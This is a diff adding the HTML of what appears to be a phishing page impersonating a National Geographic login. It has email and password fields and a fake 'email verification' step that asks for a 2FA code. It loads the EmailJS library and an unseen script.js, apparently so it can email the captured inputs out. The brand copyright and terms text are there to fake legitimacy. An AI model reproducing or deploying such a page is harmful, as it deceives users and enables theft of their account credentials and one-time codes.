@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+
+<!-- Created by Hygyjffghy Studios, all rights reserved. -->
+<!-- September, 2023                                     -->
+
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="dark" name="color-scheme">
+    <title>Login | National Geographic</title>
+    <link href="style.css" rel="stylesheet" type="text/css">
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+
+    <script src="script.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    
+</head>
+<body>
+    <div id="background-image">
+
+        <!-- Login Page -->
+        <div class="login-page" id="signin" style="display: block;">
+            <h1 style="margin-top: 60px; font-size: 40px; font-weight: 800;">SIGN IN</h1>
+            <p>Sign Into your National Geographic account to gain access to exclusive content. If you do not have one yet, you can create an account by clicking the link below.</p>
+
+            <form action="javascript:void(0);">
+                <input type="email" class="userinput" placeholder="Email" id="emailinput" required>
+                <input type="password" class="userinput" placeholder="Password" id="passwordinput" required>
+                <input type="submit" class="button" onclick="loginattempt()" value="CONTINUE">
+            </form>
+
+            <p style="font-size: 10px; text-align: center;">New to NatGeo? Create a new account <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">here</a>.</p>
+
+            <p class="footer">By pressing "Continue", you agree to National Geographic's Terms of Service (ToS).
+            <br>
+            Copyright © 1996-2015 National Geographic Society</p>
+        </div>
+
+        <!-- 2FA Page -->
+        <div class="login-page" id="verify" style="display: none;">
+            <h1 style="margin-top: 60px; font-size: 40px; font-weight: 800;;">EMAIL VERIFICATION</h1>
+            <p>Before you login, we need to verify this is your account. Please check your email for a verification code and enter the code in below. <br>Not recieving the code? Try again in 5-10 minutes and press the resend button below.</p>
+            
+            <form action="javascript:void(0);">
+                <input type="password" class="userinput" placeholder="Verification Code" id="verificationinput" required>
+                
+                <input type="submit" class="button" onclick="twofa()" value="CONTINUE">
+                <input type="submit" class="button2" onclick="resendCode()" id="resendcode" value="RESEND CODE">
+
+                <p style="text-align: center; color: red; display: none;" id="invalidcode">Incorrect verification code.</p>
+                
+            </form>
+        </div>
+
+    </div>
+
+    
+</body>
+</html>
